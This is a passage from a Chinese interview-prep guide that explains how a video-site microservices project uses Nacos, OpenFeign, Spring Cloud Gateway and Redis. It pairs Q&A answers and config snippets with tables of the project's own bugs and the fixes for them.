    | 健康检查 | 心跳 + 主动探测 | 只有心跳 | 会话 |
    | 控制台 | 中文、开箱即用 | 有但简陋 | 无 |
    | 生态 | SpringCloud Alibaba 原生 | Netflix 停止维护 | 需自己封装 |
    
    Eureka 2.x 已经停止开发，Netflix 组件整体退场；Zookeeper 作为注册中心会出现「CP 牺牲可用性」——注册中心短暂不可用就拒绝服务，对注册中心这种基础设施不划算。Nacos 一体两用（注册+配置）、中文文档完善、跟 SpringCloud Alibaba 版本对齐，是我选它最实在的理由。
  - **③ 局限**：Nacos 单机模式（我项目里就是 `127.0.0.1:8848` 单节点）**没有高可用**，生产必须至少 3 节点集群 + 外部 MySQL 存储。这一点我在项目文档里标注了。

**Q2 [必答] 服务注册与发现的完整流程讲一下。**

- **答**：
  1. **注册**：服务启动时，`nacos-discovery` 的自动配置创建 `NacosAutoServiceRegistration`，把 `spring.application.name` + 本机 `ip:port` + 元数据（metadata）通过 `POST /nacos/v1/ns/instance` 注册到 Nacos；
  2. **心跳**：默认**每 5 秒**发一次心跳（Nacos 1.x 是客户端主动上报，2.x 引入 gRPC 长连接 + 服务端主动探测），连续 **15 秒**没收到标记为不健康，**30 秒**没收到则剔除；
  3. **订阅**：消费者（比如 `notice`）通过 `@FeignClient(name = "video")` 触发 `NacosServiceDiscovery` 的订阅，拿到 video 的实例列表并**缓存在本地**；
  4. **推送**：实例变化时 Nacos 通过 **UDP 推送 + 客户端定时拉取**（兜底）通知消费者刷新本地缓存；
  5. **负载均衡**：Feign 调用时由 `Spring Cloud LoadBalancer` 从本地实例列表里按策略（默认轮询）选一个发起 HTTP 请求。
  
  - **项目实证**：`VideoClient` 声明的是 `@FeignClient(name = "video")`，而 video 服务在 Nacos 里注册的名字就是 `spring.application.name: video`，两端靠**服务名**对上。

**Q3 [进阶] 你项目里的版本是怎么对齐的？为什么这个很重要？**

- **考点**：微服务项目最常见的事故来源。

- **答**：我的版本矩阵是：
  ```
  SpringBoot           2.6.11
  SpringCloud          2021.0.4
  SpringCloud Alibaba  2021.0.4.0
  Nacos Client         2.1.2.RELEASE
  Elasticsearch        7.13.3
  ```
  这三个 Spring 版本必须**严格配对**：SpringCloud 2021.0.x 官方对应 SpringBoot 2.6.x，SpringCloud Alibaba **2021.0.4.0** 又对应 SpringCloud **2021.0.4**。差一个小版本就会出现 `NoSuchMethodError` / `ClassNotFoundException`，比如 `LoadBalancer` 的 `ReactorServiceInstanceLoadBalancer` 接口签名变化。
  
  - **项目里的两个真实处理**：
    1. `nacos-discovery` 里**排除 Ribbon**（`java/pom.xml:314-320`）：SpringCloud 2021 已经把 Ribbon 移除，但 Nacos 老版本 starter 还带着它，不排除会出现「两个负载均衡器打架」；
    2. 单独引入 `spring-cloud-starter-loadbalancer` 3.1.4，显式指定新负载均衡器。
  
  - **加分句**：SpringBoot 2.6 默认禁用了循环依赖（`spring.main.allow-circular-references=false`），这个项目里 `gateway` 显式配了 `allow-bean-definition-overriding: true`，说明遇到过 Bean 覆盖问题。

**Q4 [深挖] 你的 video 和 search 服务也没注册 Nacos，而且其实全都没注册，你怎么解释？**

- **考点**：**这题会杀死 90% 堆技术栈的候选人**，因为面试官一查依赖树就发现了。

- **答**（分三层，从局部到全局，**必须诚实**）：
  - **第一层（局部）**：`gateway`、`notice`、`user_center` 的 yml 里有 `spring.cloud.nacos.discovery.server-addr`，看起来是注册的；而 `video/application.yml` 和 `search/application.yml` 里整段是被**注释掉**的：
    ```yaml
    #  cloud:
    #    nacos:
    #      discovery:
    #        server-addr: 116.62.71.84:8848
    ```
  - **第二层（原因）**：这两个服务是 Feign 的**被调用方**，而项目里所有 Feign 客户端都用 `url` 写死地址：
    ```java
    @FeignClient(name = "video", url = "${service.video.url:http://localhost:10201}")
    ```
    `url` 一旦显式指定，Feign 就**跳过服务发现的地址解析**，直接请求该地址。所以「不注册也能跑通」，作者就把注册注释掉了。
  - **第三层（更严重的真相）**：**其实全都注册不了**。我核对过：父 POM 只在 `dependencyManagement` 里声明了 nacos 版本，**没有任何子模块真正引入 starter**（`common/pom.xml:55` 那行是注释掉的），解包构建好的 jar 里**一个 nacos 类都没有**。所以那 4 个服务的 yml 配置**是被 Spring 静默忽略的死配置**。
  - **该怎么改**（三件套，缺一不可）：
    1. 引入依赖：`spring-cloud-starter-alibaba-nacos-discovery`（把注释打开或加到 `common`）；
    2. 去掉 Feign 的 `url`，只留 `@FeignClient(name = "video")`，让 LoadBalancer 去解析服务名；
    3. 网关路由 `uri` 从 `http://localhost:10201` 改成 **`lb://video`**。
  - **这一处的价值**：`discovery.locator.enabled: true` 这个配置**也同样是空转的**——没有 `DiscoveryClient` 实现，自动路由根本不会生成。这三处（依赖、Feign url、网关 lb://）是**必须一起改才有意义**的，改一处等于没改。

**Q5 [进阶] Nacos 除了注册中心还做了什么？项目里用了吗？**

- **答**：Nacos 还有**配置中心**能力（`nacos-config`），而且我项目里已经引入了依赖：
  ```xml
  <dependency>
      <groupId>com.alibaba.cloud</groupId>
      <artifactId>spring-cloud-starter-alibaba-nacos-config</artifactId>
  </dependency>
  <dependency>
      <groupId>org.springframework.cloud</groupId>
      <artifactId>spring-cloud-starter-bootstrap</artifactId>
  </dependency>
  ```
  
  - **关键知识点**：SpringCloud 2020 之后，**`bootstrap.yml` 默认不再被加载**，必须显式引入 `spring-cloud-starter-bootstrap` 才能让配置中心在**普通 `application.yml` 之前**初始化。我引入了这个依赖说明当时是想用配置中心的。
  - **但现状是没用上**：项目里没有 `bootstrap.yml`，配置都写在各服务的 `application.yml` 里。
  - **正确用法**（我该做的）：
    ```yaml
    # bootstrap.yml
    spring:
      application:
        name: chat
      cloud:
        nacos:
          config:
            server-addr: 127.0.0.1:8848
            file-extension: yml
            group: DEFAULT_GROUP
    ```
    然后在 Nacos 控制台建 `chat-dev.yml`，配 `@RefreshScope` 就能**改配置不重启**。
  - **这正好解决一个大问题**：`chat` 模块的星火 `appId/apiKey/apiSecret` 现在是硬编码在 `Constant.java` 里的 `"xxx"`（脱敏占位），**放 Nacos 加密配置是标准解法**——既不进 git，又能动态轮换。这是我下一步一定要做的改动。

**Q6 [进阶] Nacos 的 AP 模式和 CP 模式怎么选？**

- **答**：
  - **AP（默认，Distro 协议）**：优先保证可用性。注册中心短暂不一致没关系，客户端多拉几次就能收敛。**服务发现场景选 AP**——注册中心挂了不该导致整个系统不可用。
  - **CP（Raft 协议）**：优先保证一致性。**配置中心场景更适合 CP**——配置读到了旧值会导致严重问题，宁可拒绝服务也不要返回错的配置。
  - Nacos 通过 `curl -X PUT '$NACOS/ns/operator/switches?entry=serverMode&value=CP'` 切换。**我项目里用的是默认 AP 模式**，对注册发现场景是对的。

### 3.3 主动暴露的坑

| 问题 | 位置 | 严重度 | 正确做法 |
|---|---|---|---|
| **nacos 依赖从未被引入，注册功能不存在** | `common/pom.xml:55`（注释）；5 个 jar 内无 nacos | 🔴 致命 | 引入 starter（见 3.1.1） |
| video/search 的 nacos 配置被注释 | 两个 `application.yml` | 🟠 高 | 打开配置 |
| Feign 全部写死 url，绕过服务发现 | `VideoClient:14`、`SendNoticeClient:17`、`SearchClient` | 🟠 高 | 只用 `name`，交给 LoadBalancer |
| 网关路由写死 `http://host:port` | `gateway/application-dev.yml` routes | 🟠 高 | 改 `lb://service-name` |
| `discovery.locator` 空转 | gateway yml | 🟡 中 | 先把依赖引入才有意义 |
| Nacos 引入 config 依赖但没用 | `java/pom.xml:302-304` | 🟡 中 | 用起来（正好解决密钥硬编码） |
| Nacos 单节点无高可用 | 各 yml `127.0.0.1:8848` | 🟡 中 | 生产 3 节点集群 + 外部 MySQL |

> **面试策略提醒**：Nacos 是你简历上第 4 个技术栈。**主动交代 3.1.1 那个事实，比被面试官查出来强一百倍**——主动交代是「有工程自省能力」，被查出来是「简历造假」。而且你交代完之后紧接着给出「三件套」的修法，反而证明了你是真懂服务发现该长什么样。

---

## 第 4 章 OpenFeign —— 远程调用服务

### 4.1 在这个项目里它扮演什么角色

**一句话**：Feign 让「调另一个服务」变得像「调本地方法」。项目里**所有跨服务调用都收敛到 `java/common` 的 3 个 Feign 接口里**，业务代码不认识 HTTP。

**三个 Feign 客户端（背下来）**

| 接口 | 目标服务 | 方法数 | 职责 |
|---|---|---|---|
| `SendNoticeClient` | notice(30000) | 6 | 发动态/点赞/评论/私聊/投稿/数据同步消息 |
| `VideoClient` | video(10201) | 3 | 通知模块回拉视频流、回传转码结果和封面 |
| `SearchClient` | search(8201) | 1+ | 拿推荐视频 |

**源码位置**：`java/common/src/main/java/ljl/bilibili/client/{notice,video,search}/`

**调用链实例（投稿后的完整远程调用）**

```
video.UploadAndEditServiceImpl.uploadTotal()
  ├─ client.sendUploadNotice(...)   → notice 服务 → RocketMQ "video-encode"
  └─ client.dynamicNotice(...)      → notice 服务 → RocketMQ "dynamic"

notice.VideoEncodeConsumer.onMessage()
  ├─ videoClient.getVideo(...)      → video 服务 → MinIO 拉流
  ├─ videoClient.uploadVideoCover() → video 服务 → 写回封面
  └─ videoClient.uploadVideo()      → video 服务 → 回传转码后视频
```

### 4.2 高频问答

**Q1 [必答] OpenFeign 的原理是什么？**

- **答**：核心是**「接口 + 注解 → 动态代理 → HTTP 请求」**。
  1. `@EnableFeignClients` 触发扫描，找到所有 `@FeignClient` 标注的接口；
  2. 为每个接口创建 `FeignClientFactoryBean`，它通过 **JDK 动态代理**生成一个代理对象注册到 Spring 容器；
  3. 调用代理方法时，`ReflectiveFeign` 把方法调用转成 `SynchronousMethodHandler`；
  4. `Contract`（默认 `SpringMvcContract`）解析方法上的 `@GetMapping`/`@PostMapping` 等注解，生成 `RequestTemplate`（URL、method、header、body）；
  5. `Encoder` 把参数编码进请求（对象 → JSON，`MultipartFile` → multipart）；
  6. `Client` 发起真实 HTTP 调用（默认 `Client.Default`，引入 LoadBalancer 后是 `FeignBlockingLoadBalancerClient`）；
  7. `Decoder` 把响应反序列化成返回类型。
  
  - **项目实证**：`SendNoticeClient.sendDBChangeNotice(@RequestBody Map<String,Object> map)` 这个方法在我代码里调用方式和本地方法一模一样，但底下是一次真实的 HTTP POST 到 `http://localhost:30000/DBChange/sendDBChangeNotice`。

**Q2 [必答] 你项目里 Feign 是怎么用的？举一个完整例子。**

- **答**（讲投稿这条链，因为它最能体现 Feign 的价值）：
  ```java
  // 1. common 模块声明接口（服务名 + 路径 + 参数）
  @FeignClient(name = "notice", url = "${service.notice.url:http://localhost:30000}")
  @Component
  public interface SendNoticeClient {
      @PostMapping("/notice/sendUploadNotice")
      Boolean sendUploadNotice(@RequestBody UploadVideo uploadVideo);
  }

  // 2. video 服务注入使用（像调用本地方法）
  @Resource
  SendNoticeClient client;
  ...
  client.sendUploadNotice(new UploadVideo()
          .setVideoId(video.getId()).setVideoName(video.getName())
          .setUrl(url).setHasCover(false));

  // 3. notice 服务实现（普通 Controller）
  @PostMapping("/notice/sendUploadNotice")
  public Boolean sendUploadNotice(@RequestBody UploadVideo uploadVideo) {
      return sendNoticeService.sendUploadNotice(uploadVideo);   // → RocketMQ "video-encode"
  }
  ```
  - **为什么这样设计**：把「异步消息的发送」藏在 notice 服务后面，video 服务只需要「通知一下通知服务」，**不关心是同步落库还是异步发 MQ**。以后要把 RocketMQ 换成 Kafka，只改 notice，video 一行不动——这是**依赖倒置**的实际收益。

**Q3 [进阶] 为什么要把 Feign 接口放在 `common` 模块？**

- **答**：
  - **好处**：调用方（video）和被调用方（notice）**共享同一份接口契约**，路径、参数类型、返回类型编译期就对齐，不会出现「改了一边忘了另一边」。
  - **代价**：`common` 被所有服务依赖，**它成了耦合中心**——任何一个实体类改动都会触发全部服务重新构建（我在项目文档里标注过这个约束）。
  - **进阶做法**：更规范的是「**每对服务之间单独出一个 api 包**」（如 `notice-api`、`video-api`），配合私服做版本管理，避免一个巨型 common。或者用 **DTO + MapStruct** 做防腐层，让 `common` 里只放 DTO 不放实体。
  - **我这边的实际风险**：`common` 里的实体（如 `Video`、`Chat`）同时被**数据库实体**和**Feign 传输对象**两个角色复用，一旦数据库加字段，接口契约就被动变化——这是典型的**贫血耦合**。

**Q4 [进阶] Feign 的超时和重试怎么配？你项目里配了吗？**

- **答**：
  - **配置方式**（Feign 默认使用 Ribbon/LoadBalancer + 底层 HTTP 客户端）：
    ```yaml
    feign:
      client:
        config:
          default:
            connectTimeout: 5000
            readTimeout: 10000
            loggerLevel: basic
    ```
    或者对具体服务单独配 `feign.client.config.notice.readTimeout`。
  - **现状**：**我项目里没有配**（yml 里搜不到 `feign:` 段），用的是默认值——`connectTimeout` 10 秒、`readTimeout` 60 秒。
  - **这为什么是问题**：`VideoEncodeConsumer` 里 `videoClient.getVideo()` 拉的是**整个视频文件的流**，读超时 60 秒对大文件完全不够；反过来 `sendDBChangeNotice` 这种轻请求超时 60 秒又太长，故障时会拖住线程。**应该按接口性质分别配**：流式接口单独放宽，控制类接口收紧。
  - **重试**：Feign 默认 `Retryer.NEVER_RETRY`（不重试），但 SpringCloud 的 LoadBalancer 层有重试策略。**重试必须考虑幂等性**——`sendUploadNotice` 重复调用会发两条转码消息，转码两次，浪费算力。所以我在设计上倾向「**不加自动重试，靠 RocketMQ 的消费重试兜底**」，因为 MQ 侧的重试有明确的幂等控制点。

**Q5 [深挖] Feign 传 `MultipartFile` 有什么坑？**

- **考点**：**这题是实际踩过的坑，很有说服力**。

- **答**：
  1. **要显式声明 `consumes`**：`@PostMapping(value="/videoEncode/uploadVideo", consumes = MediaType.MULTIPART_FORM_DATA_VALUE)`，否则 Feign 会按 `application/json` 编码，服务端拿不到文件。
  2. **要引入 form 编码器**：SpringCloud 2021 里需要 `feign-form` / `spring-cloud-starter-openfeign` 带 `feign-form-spring`，否则报 `Encoder not found for class MultipartFile`。
  3. **`Resource` 不能直接当 `MultipartFile` 用**：我用 `CustomMultipartFile` 做了适配——它实现了 `MultipartFile` 接口，包装一个 `InputStream`/`byte[]`。源码在 `common/client/file/CustomMultipartFile.java`。
  4. **大文件走 Feign 会 OOM**：Feign 默认把请求体**在内存里完整组装**（`Encoder` 返回 `byte[]`），所以传输百 MB 的视频流会打爆堆内存。正确做法是**走对象存储直传**（MinIO 预签名 URL）或者用 `@RequestPart` + `Streaming` 模式。
  5. **项目里真实的行为**：`VideoClient.getVideo()` 返回 `ResponseEntity<Resource>`，服务端返回 `InputStreamResource`，这个组合对**流式读取**是可行的，但 Feign 的响应仍会被缓冲，大文件依然有风险。

**Q6 [深挖] 那你的 Feign 调用失败怎么处理？**

- **答**（诚实作答）：
  - **现状**：`UploadAndEditServiceImpl` 里发送数据同步消息用了 `CompletableFuture.runAsync(() -> client.sendDBChangeNotice(map))`——**Fire-and-forget**，对外面包了一层 try/catch 就完事。如果 notice 服务挂了，这个通知**静默丢失**，ES 里就永远没有这条视频。
  - **应该怎么做**（三层）：
    1. **本地消息表**：先在本服务事务里写一条「待发送消息」记录，再发 MQ/HTTP，成功后标记完成；定时任务扫未完成的补发。这能保证「业务成功 → 消息一定最终发出」。
    2. **Feign 降级**：给 `SendNoticeClient` 加 fallback（`@FeignClient(fallbackFactory = ...)`），调用失败时记日志 + 落重试表，而不是抛异常污染主流程。
    3. **熔断**：用 Sentinel（项目里已引入 `sentinel-core` 1.8.6）给 notice 调用加熔断，避免下游挂掉时请求堆积拖死 video 服务。
  - **加分句**：这个问题本质是「**分布式事务的最终一致性**」问题，我采用的是**最大努力通知 + 对账**的思路；更严格的做法是本地消息表或 Seata。

### 4.3 主动暴露的坑

| 问题 | 位置 | 严重度 | 正确做法 |
|---|---|---|---|
| 未配置 Feign 超时 | 各 yml | 🟠 高 | 按接口性质分级配置 |
| `url` 写死绕过服务发现 | 3 个 Client | 🟠 高 | 只留 `name` |
| 异步通知静默丢失 | `UploadAndEditServiceImpl:130` | 🟠 高 | 本地消息表 + 定时补发 |
| 无 fallback / 熔断 | 3 个 Client | 🟡 中 | fallbackFactory + Sentinel |
| Feign 传大文件会 OOM | `VideoClient.getVideo` | 🟡 中 | 预签名 URL 直传 |
| `common` 实体既是 DB 实体又是 DTO | `java/common/entity/**` | 🟡 中 | 拆 DTO + 防腐层 |

---

## 第 5 章 Spring Cloud Gateway —— 请求入口与路由网关

### 5.1 在这个项目里它扮演什么角色

**一句话**：Gateway 是全站**唯一入口（8200）**，干三件事：**路由转发**（把 `/play/**` 转到 video、`/chat/**` 转到 1688）、**鉴权**（Security + JWT）、**WebSocket 协议路由**（`ws://` 转发）。

**路由表（`gateway/application-dev.yml`）**

| id | uri | Path 断言 | 目标 |
|---|---|---|---|
| `websocket` | `ws://localhost:1688` | `/ljl/chat` | chat（WebSocket） |
| `route1` | `http://localhost:30000` | `/changeNoticeStatus/**,/getNotice/**` | notice |
| `route2` | `http://localhost:3000` | `/ensemble/**,/follow/**,/selfCenter/**,/userInfo/**` | user_center |
| `route3` | `http://localhost:10201` | `/collect/**,/comment/**,/danmaku/**,/videoToEnsemble/**,/like/**,/createCenter/**,/play/**` | video |
| `route4` | `http://localhost:1688` | `/chat/**` | chat（HTTP 接口：文生图/PPT） |
| `route5` | `http://localhost:8201` | `/search/**` | search |

**另有**：`spring.cloud.gateway.discovery.locator.enabled: true` + `lower-case-service-id: true` → 开启「按服务名自动路由」，即 `/video/**` 自动转发到 Nacos 里的 `video` 服务。

### 5.2 高频问答

**Q1 [必答] Gateway 和 Zuul 有什么区别？为什么选 Gateway？**

- **答**：
  | 维度 | Spring Cloud Gateway | Zuul 1.x | Zuul 2.x |
  |---|---|---|---|
  | 编程模型 | **响应式（WebFlux + Reactor + Netty）** | 阻塞（Servlet 线程模型） | 响应式（Netty） |
  | 线程模型 | 少量 EventLoop 线程处理海量连接 | 一请求一线程 | 响应式 |
  | 长连接/WebSocket | **原生支持** | 支持差 | 支持 |
  | 维护状态 | Spring 官方主线 | Netflix 停止维护 | 未整合进 SpringCloud |
  | 限流熔断 | 内置 `RequestRateLimiter` 过滤器（基于 Redis 令牌桶） | 需自己写 | 需自己写 |
  
  - **选它的两个硬理由**：① 我项目里有 **WebSocket 长连接**，Zuul 1.x 基于 Servlet 阻塞模型，代理长连接会长期占用线程；② SpringCloud 2021 已经把 Zuul 从依赖管理里移除了，用 Zuul 要自己锁版本。
  - **代价**：WebFlux 的响应式编程模型门槛高，调试比 MVC 难（不能简单地打线程栈），而且**跟 MVC 生态混用会踩坑**——我 `SecurityConfig` 里那个手动注入 `HttpMessageConverters` 就是这个代价的具体体现。

**Q2 [必答] 你的路由是怎么配的？为什么不用服务发现自动路由？**

- **答**：我用的是**「显式路由为主 + 自动路由为辅」**的混合方式：
  - **显式路由（routes）**：在 yml 里写死 `id` + `uri` + `predicates`。这样**粒度可控**——同一个服务可以按业务路径拆成多条规则（notice 只暴露 `/getNotice/**`，video 只暴露 `/play/**` 这类），避免把服务内部所有接口都暴露到公网。而且路径规则就是**接口白名单**，安全边界清晰。
  - **自动路由（discovery.locator）**：我开了 `enabled: true` + `lower-case-service-id: true`，本意是让 Nacos 里的服务自动生成 `/{serviceId}/**` 路由，开发调试时临时加服务不用改网关配置。
  - **⚠️ 但这里我要主动说明一个事实**：**它现在是空转的**。因为项目里**没有任何模块真正引入 nacos-discovery 依赖**（见 3.1.1），Spring 容器里根本没有 `DiscoveryClient` 实现，`discovery.locator` 找不到可枚举的服务，**不会生成任何路由**。所以这个配置目前是「写了但不生效」。
  - **代价与风险**：即便修好依赖，自动路由在生产也是**安全隐患**——只要服务注册到 Nacos，它所有接口就自动暴露，绕过了显式路由的白名单控制。**生产应该关掉 `discovery.locator.enabled`**，只用显式路由；或者用 `filters` 加统一鉴权兜底。
  - **加分句**：`lower-case-service-id` 这个参数必须开，因为服务名可能是大写（`VIDEO`），而路径约定是小写，不开匹配不上。

**Q3 [必答] Gateway 怎么转发 WebSocket？**

- **考点**：**这是项目里最有区分度的网关知识点**。

- **答**：
  ```yaml
  - id: websocket
    uri: ws://localhost:1688          # 注意协议是 ws://，不是 http://
    predicates:
      - Path=/ljl/chat
  ```
  1. **`uri` 必须用 `ws://` / `wss://` 协议头**。Gateway 内置了 `WebsocketRoutingFilter`，它在检测到 `uri` 是 ws 协议时会**自动做协议升级转换**（把入站的 HTTP Upgrade 握手转成对后端的 WebSocket 连接）。如果写成 `http://localhost:1688`，握手期的 `Upgrade: websocket` 头会被当普通 HTTP 转发，后端返回 426/400。
  2. **`Path` 用前缀匹配**：`/ljl/chat` 对应 chat 服务里 `WebSocketConfig` 注册的端点 `/ljl/bilibili/chat`。注意这里有个**路径不一致的隐患**——网关断言写的是 `/ljl/chat`，服务端注册的是 `/ljl/bilibili/chat`，说明实际访问路径是 `/ljl/chat`（网关不做路径重写，直接把原路径转给后端），那服务端应该监听 `/ljl/chat` 才对。**这个不一致我要主动核实**，否则面试官让我现场演示连不上就尴尬了。
  3. **长连接的超时**：Gateway 基于 Netty，默认对空闲连接没有硬性超时，但中间如果有 Nginx，**必须放宽 `proxy_read_timeout`**（默认 60 秒空闲断开），并且要转发 `Upgrade`/`Connection` 头。
  4. **鉴权绕过**：WebSocket 握手**不经过 Security 的 `ServerHttpSecurity` 过滤器链的常规路径**（因为不是普通 HTTP 请求），而且浏览器的 WebSocket API **不能自定义请求头**——这就是为什么项目里 WebSocket 的身份校验是靠前端在 `init` 消息里传 `userId`，属于**鉴权覆盖不全**。正确做法是在握手 URL 上带 `?token=xxx`，用 `HandshakeInterceptor` 校验。

**Q4 [进阶] Gateway 的三大核心概念讲一下。**

- **答**：
  - **Route（路由）**：网关的最小转发单元，由 `id`（唯一标识）+ `uri`（目标地址）+ `predicates`（匹配条件）+ `filters`（处理链）组成。
  - **Predicate（断言）**：Java 8 的 `Predicate<ServerWebExchange>`，决定「这个请求是否走这条路由」。内置 12+ 种：`Path`、`Method`、`Header`、`Query`、`Cookie`、`Host`、`Before/After/Between`（时间）、`RemoteAddr`、`Weight`（权重，做灰度发布用）。
  - **Filter（过滤器）**：分 `GatewayFilter`（作用于单条路由）和 `GlobalFilter`（作用于所有路由）。核心用途：`StripPrefix`（去前缀）、`RewritePath`（重写路径）、`AddRequestHeader`、`RequestRateLimiter`（限流）、`CircuitBreaker`（熔断）、`Retry`。
  
  - **项目实证（可加的自定义 GlobalFilter，体现理解）**：我现在缺一个「统一注入 userId」的全局过滤器，正确写法是：
    ```java
    @Component
    public class UserContextFilter implements GlobalFilter, Ordered {
        @Override
        public Mono<Void> filter(ServerWebExchange exchange, GatewayFilterChain chain) {
            // 从 SecurityContext 拿网关已解析的 userId，注入下游请求头
            return ReactiveSecurityContextHolder.getContext().flatMap(ctx -> {
                Authentication auth = ctx.getAuthentication();
                if (auth == null || !auth.isAuthenticated()) return chain.filter(exchange);
                ServerHttpRequest req = exchange.getRequest().mutate()
                        .header("X-User-Id", String.valueOf(auth.getPrincipal())).build();
                return chain.filter(exchange.mutate().request(req).build());
            });
        }
        @Override public int getOrder() { return -100; }   // 越早越好
    }
    ```
    有了它，下游服务就不用再信任前端传的 userId 了——这是修掉「网关不做身份传递」这个缺陷的完整方案。

**Q5 [进阶] 网关能做限流吗？怎么做的？**

- **答**：能，而且是 Gateway 的招牌能力之一。内置 `RequestRateLimiter` 过滤器，基于 **Redis + Lua 脚本**实现**令牌桶算法**：
  ```yaml
  filters:
    - name: RequestRateLimiter
      args:
        redis-rate-limiter.replenishRate: 10     # 令牌桶每秒填充速率
        redis-rate-limiter.burstCapacity: 20     # 桶容量（允许的突发流量）
        redis-rate-limiter.requestedTokens: 1    # 每个请求消耗的令牌数
        key-resolver: "#{@ipKeyResolver}"        # 限流维度
  ```
  再定义一个 `KeyResolver` Bean 决定「按什么维度限流」——按 IP（`getRemoteAddress()`）、按用户（从 token 解析 userId）、按接口路径。
  
  - **项目现状**：**没有配置限流**。但 `sentinel-core` 已经引入（`java/pom.xml:194-198`），说明作者本来打算用 Sentinel 做网关限流。**Sentinel 的 `SentinelGatewayFilter` + `GatewayFlowRule`** 是另一套方案，功能更强（支持 QPS 限流、热点参数限流、熔断降级、可视化控制台），对 `video` 的投稿接口和 `chat` 的 AIGC 接口（**都是烧钱/烧资源的接口**）尤其必要。
  - **我的改进优先级**：`/chat/getImage`、`/chat/getPPT` 这两个 AIGC 接口**必须限流**——调用一次就是真金白银。

**Q6 [深挖] 你网关现在有什么问题？**

- **答**（主动列，按严重度排）：
  1. **🔴 鉴权形同虚设**：见第 2 章 Q4，过滤器不解析 JWT，`hasAuthority("role:user")` 恒真。
  2. **🔴 路由 `uri` 写死 localhost**：所有路由都是 `http://localhost:10201` 这种硬编码，**和 Nacos 服务发现完全脱节**。容器化后 `localhost` 指向容器自己，全部路由失效（我在项目文档里记了这个 FIX：外置配置覆盖）。正确做法是 `uri: lb://video`（`lb://` 前缀表示走 LoadBalancer + 服务发现）。
  3. **🟠 无跨域（CORS）配置**：前后端分离必须配 CORS，否则浏览器预检失败。目前是靠前端 dev server 代理（`vue.config.js`）绕过的，**生产环境必然出问题**。
  4. **🟠 无全局异常处理**：`gateway` 显式关掉了 `GlobalExceptionHandler`（`global-exception-handler.enabled: false`），所以网关层抛异常时返回的是 Netty 默认错误页/500，格式和其他服务不统一。应该用 `ErrorWebExceptionHandler` 自定义。
  5. **🟡 无请求日志/限流/熔断**：生产网关应该有访问日志（含 traceId）、限流规则、下游熔断。
  6. **🟡 路由规则与业务耦合**：`route3` 一长串路径（`/collect/**,/comment/**,/danmaku/**...`）其实是把 video 服务的 Controller 结构抄了一遍，改接口就要改网关。更好的做法是按**前缀统一**：`/video/**` → `lb://video` + `StripPrefix=1`。

### 5.3 主动暴露的坑

| 问题 | 位置 | 严重度 | 正确做法 |
|---|---|---|---|
| 路由 uri 写死 localhost | `application-dev.yml` routes | 🔴 致命 | 改 `lb://service-name` |
| 鉴权恒真 | `JwtAuthorizationFilter` | 🔴 致命 | 解析 JWT + 注入 `X-User-Id` |
| 无 CORS | `SecurityConfig` | 🟠 高 | 配 `CorsWebFilter` / `corsConfigurationSource` |
| discovery-locator 生产暴露全部接口 | `application-dev.yml` | 🟠 高 | 生产关闭或用过滤器兜底 |
| 无网关层异常处理 | `global-exception-handler.enabled: false` | 🟡 中 | 实现 `ErrorWebExceptionHandler` |
| 无限流 | 无 `filters` 配置 | 🟡 中 | Sentinel 网关流控（AIGC 接口优先） |
| WebSocket 路径断言与服务端注册不一致 | `/ljl/chat` vs `/ljl/bilibili/chat` | 🟡 中 | 核实并统一 |

---

## 第 6 章 Redis —— 跨服务缓存 / 共享状态

### 6.1 在这个项目里它扮演什么角色

**一句话**：Redis 在这个项目里**不是"缓存"（没有一处缓存热点数据）**，而是**跨服务的共享状态存储**。它承担了 4 件完全不同的事：

| 用途 | 服务 | Key 设计 | 数据结构 | TTL |
|---|---|---|---|---|
| **图形验证码** | gateway | `sessionId`（UUID 前 15 位）或 Cookie 值 | String | ❌ 无 |
| **手机/邮箱验证码** | gateway | 手机号 / 邮箱号**直接当 key** | String | ❌ 无 |
| **ES 增量同步队列** | notice 写 / search 读 | `add:video`、`delete:video`、`update:video`、`add:user`、`update:user` | List（`rightPush`） | ❌ 无 |
| **转码并发令牌** | video | `encode-count` | String（计数器） | ❌ 无 |

**这是本章第一个要主动讲的点**：四类用途里**没有一个是"缓存"**，而且**四个都没设 TTL**——这是项目里 Redis 使用最大的问题（见 6.2-Q5）。

**序列化配置（4 个 `RedisConfig`）**

每个用到 Redis 的服务都有一份 `RedisConfig`，都注册了 4 个 `RedisTemplate`：

```java
@Bean
public RedisTemplate<String, byte[]> bytesRedisTemplate(...)   // 二进制（视频流）
@Bean
public RedisTemplate<String, String> redisTemplate(...)        // 纯字符串（验证码）
@Bean
public RedisTemplate<String, Object> objectRedisTemplate(...)  // 对象（GenericFastJson）
@Bean
public RedisTemplate<String, List<Object>> listRedisTemplate(...)
```

关键点：`objectRedisTemplate` 用 `StringRedisSerializer` 做 key + `GenericFastJsonRedisSerializer` 做 value。
- **为什么 key 必须是 String 序列化**：默认的 `JdkSerializationRedisSerializer` 会把 key 序列化成带二进制前缀的字节，`redis-cli` 里看到的是 `\xac\xed\x00\x05t\x00\aadd:video` 这种乱码，运维无法排查，也无法和别的服务共享 key。
- **为什么 value 用 `GenericFastJsonRedisSerializer` 而不是 Jackson**：FastJSON 会在 JSON 里**带上 `@type` 类型信息**，反序列化时能还原成原类型（`HashMap<String,Object>` 里的字段类型不丢）。**但这正是项目里的一个坑**——search 端从 List 里读出来时字段会带 `@type` 标记，所以 `MysqlToEsHandler.normalizeVideoDocument()` 里要手动 `document.remove("@type")`。用 Jackson 的 `GenericJackson2JsonRedisSerializer` 是更安全的选择（FastJSON 有过多个反序列化 RCE 漏洞）。

### 6.2 高频问答

**Q1 [必答] 你项目里 Redis 用来做什么？**

- **答**（三段，**必须诚实说"没有做缓存"**）：
  - **① 做什么**：四件事——① 图形验证码和手机/邮箱验证码的临时存储（登录注册链路）；② **MySQL 到 Elasticsearch 增量同步的消息队列**（notice 写、search 读）；③ 视频转码的并发令牌（限制同时转码数）；④ 各服务的 `RedisTemplate` 序列化统一配置。
  - **② 为什么用 Redis 而不是别的**：
    - 验证码：**天然需要 TTL 语义 + 跨实例共享**（gateway 多副本时，用户请求可能落到不同实例，放本地 Map 会校验失败）。Redis 的 `SETEX` 就是为此设计的。
    - **ES 增量队列**：这是我这个项目里 Redis 最巧妙的用法。异步链路是「notice 消费 MQ → 写 Redis List → search 定时捞取」。我本来可以直接让 search 也去消费 MQ，但那样「MQ 的消费位点」和「ES 的写入进度」会绑在一起——**MQ 消费成功但 ES 写失败**时消息就丢了。用 Redis List 当**中间缓冲**，search 可以按自己的节奏批量消费，失败了下次任务还能重试（**前提是我没把 key 删掉，见 Q4**）。
    - 转码令牌：`INCR`/`GET`/`SET` 原子操作实现简单的计数限流，不需要引额外的限流组件。
